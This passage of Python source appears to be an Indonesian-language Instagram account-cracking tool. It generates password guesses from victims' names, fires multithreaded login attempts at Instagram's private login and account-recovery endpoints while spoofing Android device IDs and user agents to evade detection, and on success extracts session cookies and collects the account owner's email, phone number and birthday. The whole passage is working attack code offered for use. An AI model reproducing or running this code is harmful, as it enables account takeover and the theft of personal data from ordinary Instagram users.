                 self.x.append(self.z+'123456')
                 self.x.append(self.z+'22')
                 self.x.append(self.z+' 123')
                 self.x.append(self.z+' 1234')
                 self.x.append(self.z+' 12345')
                 self.x.append(self.z)
              elif komb == '2' or komb == '02':
                 self.x.append(self.z+'123')
                 self.x.append(self.z+'1234')
                 self.x.append(self.z+'12345')
                 self.x.append(self.z+'01')
                 self.x.append(self.z+'02')
                 self.x.append(self.z+'03')
                 self.x.append(self.z+'04')
                 self.x.append(self.z+'05')
                 self.x.append(self.z+'@#$')
                 self.x.append(self.z+'321')
                 self.x.append(self.z+'123@')
                 self.x.append(self.z+'123456')
                 self.x.append(self.z+'22')
                 self.x.append(self.z+' 123')
                 self.x.append(self.z+' 1234')
                 self.x.append(self.z+' 12345')
                 self.x.append(self.z)
              else:
                 self.x.append(self.z+'123')
                 self.x.append(self.z+'1234')
                 self.x.append(self.z+'12345')
                 self.x.append(self.z+'01')
                 self.x.append(self.z+'02')
                 self.x.append(self.z+'03')
                 self.x.append(self.z+'04')
                 self.x.append(self.z+'05')
                 self.x.append(self.z+'@#$')
                 self.x.append(self.z+'321')
                 self.x.append(self.z+'123@')
                 self.x.append(self.z+'123456')
                 self.x.append(self.z+'22')
                 self.x.append(self.z+' 123')
                 self.x.append(self.z+' 1234')
                 self.x.append(self.z+' 12345')
                 self.x.append(self.z)

           if len(nama) <5:pass
           else:
              self.x.append(nama.replace(' ','').lower())
              self.x.append(nama.lower())
           if komb == '3' or komb == '03':
              self.l = full.replace('_',' ').replace('.',' ').replace('__',' ')
              if len(self.l) <3:continue
              else:
                   try:
                       self.b = self.l.split(' ')
                       for self.r in self.b:
                           if len(self.r) <3:continue
                           elif len(self.r) <5:
                              self.x.append(self.r.lower() + '123')
                              self.x.append(self.r.lower() + '1234')
                              self.x.append(self.r.lower() + '12345')
                           else:
                              self.x.append(self.r.lower() + '123')
                              self.x.append(self.r.lower() + '1234')
                              self.x.append(self.r.lower() + '12345')
                              self.x.append(self.r.lower())
                   except:pass
       for self.d in self.x:
           if self.d not in self.i:
              if len(self.d) <=5:pass
              else:self.i.append(self.d)
       return self.i

   def cek_key(self, OS=None):
       try:
           if os.path.isfile('data/.keys.txt') is True:
              self.key = open('data/.keys.txt','r').read()
              self.xyz = requests.get('https://paste.tc/raw/licensu-64').text
              self.pok = re.findall(self.key + '.*', self.xyz)[0]
           else:
              if not OS:exit()
              else:pass
       except IndexError:
           if OS == True:pass
           else:exit('\nLicensi not found!')

   #-> Password
   def Exekusy2(self):
       self.KeyCek = self.cek_key(True)
       self.MyRich('\
[cyan]01[white]. [green]Sandi Full [purple]Name 1-5  [cyan]03[white]. [green]Sandi Full [purple]Name,Username 1-5\n\
[cyan]02[white]. [green]Sandi Full [purple]Name 1-6  [cyan]04[white]. [green]Sandi Full [purple]Name 1-5 + Manual',True)
       sandine = Console(style=temane[0]).input(f'   └──> ')
       if sandine not in ['1','01','2','02','3','03','4','04']:
          print(f'\n{P}[{K2}!{P}] {K2}Pilihan Tidak Tersedia')
          self.Exekusy2()

       elif sandine in ['4','04']:
          sandi_tambahan = []
          self.MyRich('[white]Gunakan Koma Untuk Pemisahan, Pastikan sandi harus 6/Lebih!',True)
          tambahan = Console(style=temane[0]).input(f'   └──> ').split(',')
          for self.tambah in tambahan:
              if len(self.tambah)<=5:pass
              else:sandi_tambahan.append(self.tambah)

       self.MyRich(f'\
[white]Akun OK Di Simpan Di Folder : data/OK-Instagram-{file_ok}\n\
Akun CP Di Simpan Di Folder : data/CP-Instagram-{file_ok}\n\
- Mainkan Mode Pesawat Jika Proses Cepat 400 ID Slow 200 -')

       self.mayb = self.OverPower()
       with ThreadPoolExecutor(max_workers=35) as exe:
          for data in self.id:
              try:
                  idf, nama = data.split('|')
                  pw = self.pwdc(nama, idf, sandine)
                  if sandine == '4' or sandine == '04':
                     pw = pw + sandi_tambahan
                  else:pw = pw
                  if '1' in self.MethodType:
                      exe.submit(self.ApiThreads, idf, pw)
                  elif '2' in self.MethodType:
                      exe.submit(self.Api, idf, pw)
                  elif '3' in self.MethodType:
                      exe.submit(self.ApiRecovery, idf, pw)
                  else:
                      exe.submit(self.SmartLockGoogle, idf, pw)
              except:pass

       if self.ResultSuccess !=0 or self.ResultChechpoint !=0:
          self.total = self.ResultSuccess + self.ResultChechpoint
          print(f'\n\n{P} Crack Selesai\n\n {H}result {self.total} \n success : {H}{self.ResultSuccess}{P}\n failed : {K2}{self.ResultChechpoint}{P}\n\n Terima Kasih Telah Menggunakan Tools Ini\n \t- {H}RullxyzNotDev! {P}')
          exit(0)
       else:
          print(f'\n\n{P} Crack Selesai\n{K2} Ups Anda Tidak Mendapatkan Hasil Kali Ini\n{K2} Silahkan Ganti Target Dan Pastikan Tidak Menggunakan Wifi')
          exit(1)

   #-> Info Akun Terkait
   def Fafo(self, cokie):
       try:
           self.c = re.findall('csrftoken=(.*?);',str(cokie))
           self.x = {"Host": "www.instagram.com","content-length": "0","x-requested-with": "XMLHttpRequest","x-csrftoken": "tJdFh5wJTuFDQZvpadl2kTm0LGRSkH8w" if len(self.c) == 0 else self.c[0],"x-ig-app-id": "936619743392459","x-instagram-ajax": "1011212827","user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36","content-type": "application/x-www-form-urlencoded","accept": "*/*","x-asbd-id": "129477","cookie":cokie}
           self.r = requests.post('https://www.instagram.com/api/v1/web/fxcal/ig_sso_users/', headers = self.x).json()
           if 'fbAccount' in str(self.r):
              self.nama = self.r['fbAccount']['display_name']
              self.Reqz = requests.get('https://accountscenter.instagram.com/profiles/', cookies = {'cookie':cokie}).text
              self.User = re.search('{"__typename":"XFBFXFBAccountInfo","id":"(.*?)"}', str(self.Reqz)).group(1)
           else:
              self.nama = None
              self.User = None
       except:
           self.nama = 'Requests Error!'
           self.User = 'Requests Error!'
       self.aku = '%s%s ➛ %s'%(H,self.User, self.nama)
       return(self.aku)

   #-> Custom Android ID
   def Android_ID(self, users, passwd):
       self.xyz = hashlib.md5()
       self.xyz.update(users.encode('utf-8') + passwd.encode('utf-8'))
       self.hex = self.xyz.hexdigest()
       self.xyz.update(self.hex.encode('utf-8') + '12345'.encode('utf-8'))
       return self.xyz

   #-> Info result OK
   def friends_user(self, cookies):
       try:
            InfoHeaders = {'x-ig-app-locale': 'in_ID','x-ig-device-locale': 'in_ID','x-ig-mapped-locale': 'id_ID','x-bloks-version-id': '8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb','x-bloks-is-layout-rtl': 'false','x-ig-capabilities': '3brTv10=','x-ig-app-id': '567067343352427','priority': 'u=3','user-agent': 'Instagram 275.0.0.27.98 Android (25/7.1.2; 240dpi; 720x1280; Google/google; google Pixel 2; x86; android_x86; in_ID; 458229257)','accept-language': 'id-ID, en-US','x-fb-http-engine': 'Liger','x-fb-client-ip': 'True','x-fb-server-cluster': 'True'}
            edit = {'edit': 'true'}
            info = requests.get('https://i.instagram.com/api/v1/accounts/current_user/', params=edit, headers=InfoHeaders, cookies = {'cookie':cookies}).json()['user']
            info_email = info['email']
            info_full_nama = info['full_name']
            info_username = info['username']
            info_nomor_hp = info['phone_number']
            info_akun_id = info['pk_id']
            info_birthday = info['birthday']
            info_kedua = requests.get(f'https://i.instagram.com/api/v1/users/{info_akun_id}/info/', headers=InfoHeaders, cookies = {'cookie':cookies}).json()['user']
            info_followers = info_kedua['follower_count']
            info_following = info_kedua['following_count']
            return info_email,info_full_nama,info_username,info_nomor_hp,info_birthday,info_followers,info_following
       except:return None

   #-> Info No Login
   def friends_user_chek(self, username):
       try:
           self.head.update({'Host': 'www.instagram.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'none'})
           req = requests.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={username}', headers=self.head).json()['data']['user']
           ikut,mengikut,posting = req['edge_followed_by']['count'],req['edge_follow']['count'],req['edge_owner_to_timeline_media']['count']
           return(ikut,mengikut,posting)
       except:return(None,None,None)

   #-> Convert cokie dict {}
   def Convert(self, dict_c):
       cokz = ';'.join(['%s=%s'%(x,y) for x,y in dict_c.items()])
       return cokz

   def AppUac(self, GoblokLu=None):
       self.infinix = ["Infinix X652B", "Infinix X680", "Infinix X690", "Infinix X625B", "Infinix X655", "Infinix X680B", "Infinix X652B", "Infinix X680", "Infinix X690", "Infinix X625B", "Infinix X655", "Infinix X680B", "Infinix X652B", "Infinix X680", "Infinix X690", "Infinix X625B", "Infinix X655", "Infinix X680B", "Infinix X652B", "Infinix X680", "Infinix X690", "Infinix X625B", "Infinix X655", "Infinix X680B", "Infinix X652B", "Infinix X680", "Infinix X690", "Infinix X625B", "Infinix X655", "Infinix X680B"]
       self.nexus = ['Galaxy Nexus', 'Nexus 10', 'Nexus 2', 'Nexus 4', 'Nexus 4', 'Nexus 4', 'Nexus 4', 'Nexus 4', 'Nexus 4', 'Nexus 5', 'phone/Nexus 5', 'Nexus 5X', 'Nexus 6', 'Nexus 7', 'Nexus 9', 'Nexus One', 'Nexus One', 'Nexus One', 'Nexus One', 'Nexus One', 'Nexus One', 'Nexus Player', 'Nexus Player', 'Nexus S', 'Nexus S', 'Nexus S 4G', 'nexus S', 'Nexus S', 'Nexus s', 'Nexus S', 'Nexus S', 'Nexus S', 'Nexus S', 'Nexus S']
       self.micromax = ['Micromax 10', 'Micromax 1J', 'Micromax 86519', 'Micromax A064', 'Micromax_A064', 'Micromax A065', 'Micromax_A065', 'Micromax A066', 'Micromax_A066', 'Micromax A067', 'Micromax_A067', 'MICROMAX_A068', 'MICROMAX A068', 'Micromax A068', 'Micromax A069', 'Micromax_A069', 'Micromax A075', 'Micromax A082', 'Micromax_A082', 'Micromax A089', 'Micromax_A089', 'Micromax A091', 'Micromax A092', 'Micromax_A092', 'Micromax A093', 'Micromax_A093', 'Micromax A095', 'Micromax A096', 'Micromax_A101', 'Micromax A102', 'Micromax_A102', 'Micromax A104', 'Micromax a104', 'Micromax A105', 'Micromax_A105', 'Micromax A106', 'Micromax-A106', 'Micromax A108', 'Micromax_A109', 'Micromax A109', 'Micromax A110', 'Micromax_A110', 'Micromax A110Q', 'Micromax_A110Q', 'Micromax A111', 'Micromax A114', 'Micromax A114R', 'Micromax_A114R', 'Micromax A115', 'Micromax_A115', 'Micromax A116', 'Micromax_A116', 'Micromax A116i', 'Micromax_A116i', 'Micromax A117', 'Micromax_A117', 'Micromax A118R', 'Micromax A119', 'Micromax A120', 'Micromax A121', 'Micromax_A121', 'Micromax A15', 'Micromax A177', 'Micromax A190', 'Micromax_A190', 'Micromax A200', 'Micromax_A200', 'Micromax A21', 'Micromax A210', 'Micromax A24', 'Micromax_A24', 'Micromax A25 Smarty', 'Micromax A250', 'Micromax A255', 'Micromax_A255', 'Micromax A26', 'Micromax_A26', 'Micromax_A27', 'Micromax A27', 'Micromax_A28', 'Micromax A28/GRI40', 'Micromax A28', 'Micromax A290', 'Micromax A30', 'Micromax A300', 'Micromax A310', 'Micromax A311', 'Micromax A315', 'Micromax_A315', 'Micromax_A316', 'Micromax A316', 'Micromax_A34', 'Micromax A34', 'Micromax_A35', 'Micromax A35', 'Micromax A350', 'Micromax_A36', 'Micromax A36', 'Micromax_A37', 'Micromax A37', 'Micromax A37B', 'Micromax_A37B', 'Micromax A40', 'Micromax_A40', 'Micromax A46', 'Micromax_A46', 'Micromax A47', 'MicromaxA47', 'Micromax_A50', 'Micromax A50', 'Micromax A51', 'Micromax A52', 'Micromax A54', 'Micromax A56', 'Micromax_A57', 'Micromax A57', 'Micromax A58', 'Micromax_A58', 'Micromax A59', 'Micromax A60', 'Micromax A61', 'Micromax A62', 'Micromax_A62', 'Micromax A63', 'Micromax_A63', 'Micromax_A65', 'Micromax A65', 'Micromax_A66', 'Micromax A66', 'Micromax A67', 'Micromax A68', 'Micromax A69', 'Micromax_A69', 'Micromax_A70', 'Micromax A700', 'Micromax A71', 'Micromax_A71', 'Micromax A72', 'Micromax_A72', 'Micromax A73', 'Micromax_A74', 'Micromax A74', 'Micromax A75', 'Micromax_A76', 'Micromax A76', 'Micromax A77', 'Micromax A78', 'Micromax A79', 'en_us Micromax A80', 'Micromax A80', 'Micromax A82', 'Micromax_A82', 'Micromax A84', 'Micromax A85', 'Micromax A86', 'Micromax_A86', 'Micromax_A87', 'Micromax A87', 'Micromax A87 . Ninja 4.0', 'Micromax A88', 'Micromax_A88', 'Micromax A89', 'Micromax A90', 'Micromax A90s', 'MIcromax_A90s', 'Micromax A90S', 'Micromax A91', 'Micromax_A91', 'Micromax_A92', 'Micromax A92', 'MicromaxA93', 'Micromax A93', 'Micromax A94', 'Micromax_A94', 'Micromax A96', 'Micromax_A96', 'Micromax A97', 'Micromax_A99', 'Micromax A99', 'Micromax_AD3520', 'Micromax AD3520', 'Micromax AD3550', 'Micromax AD4500', 'Micromax_AD4500', 'Micromax AE90', 'Micromax AO5510', 'Micromax AQ5000', 'Micromax B4A', 'Micromax B5 Pro', 'B5Pro', 'Micromax_Bharat_5_Plus', 'Micromax Q402Plus', 'Micromax Q440', 'Micromax Bharat 5', 'Micromax Q4204', 'Micromax Bharat 5 Plus', 'Micromax Bharat 5 Pro', 'Micromax Bolt 3425', 'Micromax Bolt 2', 'Micromax Q402+', 'Micromax Q306', 'Micromax Q3001', 'Micromax Q301', 'Micromax Q303', 'Micromax Q324', 'Micromax Q326', 'Q327', 'Micromax Q327', 'Micromax Q3301', 'Micromax Q333', 'Micromax_Q333', 'Micromax Q338', 'Micromax Q346', 'Micromax Q354', 'Micromax Q357', 'Micromax Q383', 'Micromax_S302', 'Micromax S302', 'Micromax Q424', 'Micromax Q352', 'Micromax Q4101', 'Micromax C2A', 'Micromax C9', 'Micromax C1', 'Micromax C1A', 'Micromax C2APLS', 'Micromax Q4310', 'Micromax E4815', 'arm_64 Micromax E481', 'Micromax E481', 'Micromax E4816', 'Micromax Q462', 'Micromax Q463', 'Micromax E485', 'Micromax E484', 'Micromax AQ4501', 'Micromax AQ4502', 'A240', 'Micromax A240', 'Micromax Q391', 'Micromax E453', 'Micromax A107', 'Micromax HS2', 'Micromax HS1', 'Micromax_HS3', 'en Micromax_HS3', 'AQ5001', 'Micromax AQ5001', 'AQ5001 Canvas Power', 'Micromax Q392', 'Micromax Q465', 'Micromax Q461', 'Micromax Q350R', 'Micromax Q421', 'Micromax Q417', 'Micromax Q426', 'Micromax Q4260', 'Micromax E311', 'Micromax E352', 'Micromax E455', 'Micromax Q415', 'Micromax Q355', 'Micromax Q469', 'Micromax E451', 'Micromax E451', 'Micromax Q340', 'Micromax Q349', 'Micromax Q345', 'Micromax Q450', 'Micromax Q480', 'arm_64 Micromax Q480', 'Micromax Q380', 'Micromax Q3502', 'Micromax Q351', 'Micromax Q385', 'P70221', 'Micromax P681', 'MicromaxP802', 'Micromax Q427', 'Micromax_Q427', 'Micromax Q413', 'Micromax E313', 'Micromax D2', 'Micromax D200', 'Micromax_D200', 'Micromax D303', 'Micromax D304', 'Micromax_D304', 'Micromax D305', 'Micromax D306', 'Micromax D320', 'Micromax D321', 'Micromax D333', 'Micromax D340', 'Micromax D7517', 'Micromax DM5003', 'Micromax E353', 'Micromax E457', 'Micromax E458', 'Micromax E460', 'Micromax E471', 'Micromax E4817', 'Micromax E482', 'Micromax E483', 'Micromax E5018M', 'Micromax EG111', 'Micromax EG116', 'micromax F', 'micromax F189', 'Micromax F601', 'MicromaxF666', 'Micromax IN', 'Micromax E7533', 'Micromax E6523', 'IN_2b', 'IN_Note1', 'MICROMAX IN1', 'N8216', 'N8301', 'ione note', 'MICROMAX ione note', 'Micromax N4120', 'Micromax N8202', 'Micromax Ninja', 'Micromax Nitro', 'Micromax Note 1+', 'Micromax Note 5', 'Micromax Note3', 'Micromax NX', 'Micromax P001', 'Micromax P250(Funbook)', 'Micromax P255', 'Micromax P256', 'xx Micromax P275', 'Micromax_P275', 'Micromax P275', 'Micromax P280', 'Micromax P290', 'Micromax P310', 'Micromax P350', 'xx Micromax P350', 'Micromax P360', 'Micromax P362', 'Micromax P365', 'Micromax P410', 'Micromax P410i', 'Micromax_P410i', 'Micromax P420', 'Micromax P469', 'Micromax P470', 'MicromaxP480', 'Micromax P500(Funbook)', 'Micromax P560', 'Micromax P580', 'Micromax P580i', 'Micromax P600', 'Micromax P650', 'Micromax P650E', 'Micromax P660', 'Micromax P660', 'Micromax_P666', 'Micromax P666', 'MicromaxP680', 'Micromax P690', 'Micromax P701', 'MicromaxP702', 'Micromax P810', 'en Micromax Q300', 'Micromax_Q300', 'Micromax Q323', 'Micromax_Q323', 'Micromax Q325', 'Micromax_Q325', 'Micromax Q331', 'Micromax_Q331', 'Micromax Q332', 'Micromax_Q332', 'Micromax Q334', 'Micromax Q335', 'Micromax_Q335', 'Micromax Q336', 'Micromax_Q336', 'Micromax Q341', 'Micromax Q343', 'Micromax Q348', 'Micromax_Q353', 'en Micromax_Q353', 'Micromax_Q353P', 'Micromax Q3551', 'Micromax Q3555', 'Micromax Q361', 'Micromax Q370', 'Micromax_Q370', 'Micromax Q371', 'Micromax_Q371', 'Micromax Q375', 'Micromax_Q375', 'Micromax Q379', 'Micromax Q381', 'Micromax Q382', 'Micromax Q386', 'Micromax Q394', 'Micromax_Q394', 'Micromax Q395', 'Micromax Q397', 'Micromax Q398', 'arm Micromax Q398', 'Micromax Q400', 'Micromax_Q400', 'Micromax Q4002', 'en Micromax Q4002', 'Micromax Q401', 'Micromax Q402', 'Micromax Q402 Ultra', 'Micromax Q404', 'Micromax Q411', 'Micromax_Q411', 'Micromax Q412', 'Micromax Q414', 'Micromax Q416', 'Micromax Q419', 'Micromax Q4201', 'Micromax Q422', 'Micromax Q4220', 'Micromax Q423', 'Micromax Q428', 'Micromax_Q428', 'Micromax Q429', '720X1280 Micromax Q4309', 'Micromax Q4312', 'en_US Micromax Q437', 'Micromax Q440Plus', 'Micromax Q454', 'Micromax Q470', 'Micromax Q479', 'Micromax Q491', 'Micromax_Q491', 'Micromax Q502+', 'Micromax Q666', 'Micromax Q67', 'micromax Q68', 'micromax Q78', 'Micromax S300', 'Micromax_S300', 'Micromax S301', 'Micromax_S301', 'Micromax Q4311', 'Micromax Q4601', 'Micromax Q409A', 'Micromax Q409', 'Micromax Q452', 'Micromax Unite 3', 'Micromax Unite 2', 'Micromax Unite 2 A106', 'Micromax Q372', 'Micromax V89', 'Micromax Q4001', 'Micromax Q4202', 'Micromax Q4251', 'arm Micromax Q4251', 'Micromax W5509', 'Micromax X5098', 'Micromax-Xzoom A52', 'YU5530', 'YU5040', 'Micromax YU5900', 'YU5012', 'Micromax Z59']
       self.onpls = ['NE2213', 'NE2217', 'NE2215', 'NE2210', 'NE2210', 'CPH2423', 'CPH2411', 'CPH2417', 'CPH2413', 'CPH2415', 'CPH2449', 'CPH2487', 'ONE A2003', 'ONE A2003', 'ONE A2001', 'ONE A2005', 'ONEPLUS A3003', 'ONEPLUS A3000', 'ONEPLUS A3010', 'ONEPLUS A5000', 'ONEPLUS A5000', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A6003', 'ONEPLUS A6000', 'ONEPLUS A6010', 'ONEPLUS A6013', 'ONEPLUS A6010', 'GM1900', 'GM1901', 'GM1903', 'GM1917', 'GM1913', 'GM1911', 'GM1910', 'GM1915', 'GM1910', 'HD1901', 'HD1903', 'HD1900 Flow', 'HD1905', 'HD1900', 'HD1907', 'HD1911', 'HD1913', 'HD1910', 'GM1925', 'HD1925', 'GM1920', 'IN2013', 'IN2015', 'IN2010', 'IN2010', 'IN2017', 'IN2019', 'IN2023', 'IN2025', 'IN2020', 'OnePlus8Pro', 'KB2005', 'KB2001', 'KB2007', 'KB2003', 'KB2000', 'OnePlus 8T 5G', 'LE2115', 'LE2113', 'LE2111', 'LE2110', 'LE2120', 'LE2125', 'LE2123', 'LE2121', 'LE2127', 'OnePlus9Pro', 'LE2101', 'LE2100', 'MT2111', 'MT2110', 'ONEPLUS A19677', 'ONEPLUS A2345', 'Oneplus A31', 'Oneplus A3331', 'ONEPLUS A35904', 'ONEPLUS A37000', 'ONEPLUS A3EVB', 'ONEPLUS A62322', 'ONEPLUS A64794', 'ONEPLUS A65369', 'ONEPLUS A68333', 'ONEPLUS A70458', 'ONEPLUS A70791', 'ONEPLUS A78637', 'ONEPLUS A80828', 'ONEPLUS A83306', 'ONEPLUS A87046', 'ONEPLUS A90641', 'Oneplus A99831', 'PGKM10', 'PGKM10', 'PHK110', 'PHK110', 'PGP110', 'PGP110', 'PGZ110', 'ONEPLUS KB2023', 'OnePlus Nord', 'Oneplus Nord 2', 'DN2103', 'DN2101', 'CPH2399', 'CPH2401', 'AC2001', 'AC2003', 'IV2201', 'CPH2409', 'CPH2381', 'CPH2465', 'EB2103', 'EB2101', 'EB2101', 'BE2025', 'BE2026', 'BE2029', 'Nord N10 5G', 'BE2028', 'BE2013', 'BE2011', 'BE2012', 'CPH2459', 'GN2200', 'CPH2469', 'DE2118', 'DE2117', 'A0001', 'ONE E1001', 'ONE E1003', 'ONE E1001', 'ONE E1005']
       self.oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
       
   def timezone_offset(self):
       self.tim = datetime.datetime.now(pytz.timezone('Asia/Jakarta'))
       self.ofs = self.tim.utcoffset().total_seconds()/60/60
       return self.ofs

   def SetMid(self):
       return '' if len(self.MID) == 0 else random.choice(self.MID)

   def Blok_ID(self):
       self.v23 = 'edf962326770574232e3938baf0c2faebdbb23703933345b000509f560bd9965'
       self.v39 = 'c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49'
       self.v09 = '9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a'
       return(random.choice([self.v09,self.v39,self.v23]))

   # pkg install iproute2
   def UseNet(self):
       #self.net = []
       #for self.y in os.popen('ip neigh show'):self.net.append(self.y)
       #if 'wlan' in str(self.net) or 'wlan0' in str(self.net):return('WIFI','WIFI')
       #else:return('MOBILE.LTE','MOBILE(LTE)')
       return('MOBILE.LTE','MOBILE(LTE)')

   def HeadersApiLogin(self):
       return {
          'host': 'b.i.instagram.com',
          'x-ig-app-locale': 'in_ID',
          'x-ig-device-locale': 'in_ID',
          'x-ig-mapped-locale': 'id_ID',
          'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
          'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
          'x-ig-bandwidth-speed-kbps': '-1.000',
          'x-ig-bandwidth-totalbytes-b': '0',
          'x-ig-bandwidth-totaltime-ms': '0',
          'x-bloks-version-id': self.Blok_ID(),
          'x-ig-www-claim': '0',
          'x-bloks-is-prism-enabled': 'false',
          'x-bloks-is-layout-rtl': 'false',
          'x-ig-device-id': 'b7b95886-a663-41e4-8025-941a72c9ac4d',
          'x-ig-family-device-id': '2ce88cf6-20e8-4b2e-bb67-8d8ed5dda357',
          'x-ig-android-id': 'android-f4d8eb2bd1b86a47',
          'x-ig-timezone-offset': str(self.timezone_offset()),
          'x-fb-connection-type': self.UseNet()[0],
          'x-ig-connection-type': self.UseNet()[1],
          'x-ig-capabilities': '3brTv10=',
          'x-ig-app-id': '567067343352427',
          'priority': 'u=3',
          'user-agent': 'Instagram 309.1.0.41.113 Android (31/12; 320dpi; 720x1460; INFINIX/Infinix; Infinix X6515; Infinix-X6515; mt6761; in_ID; 541635863)',
          'accept-language': 'id-ID, en-US',
          'x-mid': str(self.SetMid()),
          'ig-intended-user-id': '0',
          'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'content-length': '2702',
          'x-fb-http-engine': 'Liger',
          'x-fb-client-ip': 'True',
          'x-fb-server-cluster': 'True'
       }

   def ChekDuplikat(self, users):
       if str(users) not in self.bugbaru:
          self.bugbaru.append(users)
          return True
       else:
          return False

   def ApiRecovery(self,users, password):
       with requests.Session() as Client:
         try:
             for pwb in password:
                 self.session = requests.Session()
                 self.session.headers.update({**self.HeadersApiLogin(),
                      'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
                      'x-ig-bandwidth-speed-kbps': '{}'.format(random.randint(100,300)),
                      'x-ig-bandwidth-totalbytes-b': str(random.randint(500000,900000)),
                      'x-ig-bandwidth-totaltime-ms': str(random.randint(1000,9000)),
                      'user-agent': self.AppUac(self.HeadersApiLogin()['x-bloks-version-id']),
                      'x-ig-android-id': 'android-' + str(self.Android_ID(users, pwb).hexdigest()[:16]),
                      'x-ig-family-device-id': str(uuid.uuid4()),
                      'x-ig-device-id': str(uuid.uuid4())})
                 self.DataRec = {'params': '{"client_input_params":{"contact_point":"'+users+'","password":"#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(pwb)+'","event_flow":"account_recovery","family_device_id":"'+self.session.headers['x-ig-family-device-id']+'","machine_id":"'+ str(self.session.headers['x-mid']) +'","accounts_list":[],"has_whatsapp_installed":0,"login_attempt_count":1,"device_id":"'+str(self.session.headers['x-ig-android-id'])+'","headers_infra_flow_id":"","auth_secure_device_id":"","encrypted_msisdn":"","device_emails":[],"lois_settings":{"lara_override":"","lois_token":""},"event_step":"AYMH_PASSWORD_FORM","secure_family_device_id":""},"server_params":{"is_caa_perf_enabled":0,"is_platform_login":0,"is_from_logged_out":0,"login_credential_type":"none","should_trigger_override_login_2fa_action":0,"is_from_logged_in_switcher":0,"family_device_id":"'+str(self.session.headers['x-ig-family-device-id'])+'","credential_type":"password","waterfall_id":"'+str(uuid.uuid4())+'","password_text_input_id":"4kv99g:38","layered_homepage_experiment_group":null,"offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","INTERNAL__latency_qpl_instance_id":27691536400061,"device_id":"'+str(self.session.headers['x-ig-android-id'])+'","server_login_source":"device_based_login","login_source":"AccountRecovery","caller":"gslr","should_trigger_override_login_success_action":0,"ar_event_source":"first_password_failure","INTERNAL__latency_qpl_marker_id":36707139}}','bk_client_context': '{"bloks_version":"'+str(self.session.headers['x-bloks-version-id'])+'","styles_id":"instagram"}','bloks_versioning_id': str(self.session.headers['x-bloks-version-id'])}
                 self.Query   = 'params=%s&bk_client_context=%s&bloks_versioning_id=%s'%(urllib.parse.quote(self.DataRec['params']), urllib.parse.quote(self.DataRec['bk_client_context']), self.DataRec['bloks_versioning_id'])
                 self.Respons = self.session.post('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=self.Query,allow_redirects=True)
                 self._status = str(self.Respons.status_code)
                 if 'logged_in_user' in self.Respons.text.replace('\\',''):
                    self.Pepek = self.ChekDuplikat(users)
                    if self.Pepek is False:break
                    cokie = {}
                    try:
                        cok = re.search('"headers":"{"IG-Set-Authorization": "(.*?)"', str(self.Respons.text.replace('\\',''))).group(1)
                        xyz = base64.b64decode(cok.split(':')[2]).decode()
                        ds_id = re.search('{"ds_user_id":"(\d+)"', str(xyz)).group(1)
                        sn_id = re.search('"sessionid":"(.*?)"', str(xyz)).group(1)
                        cokie.update({"ds_user_id":f"{ds_id}","sessionid":f"{sn_id}"})
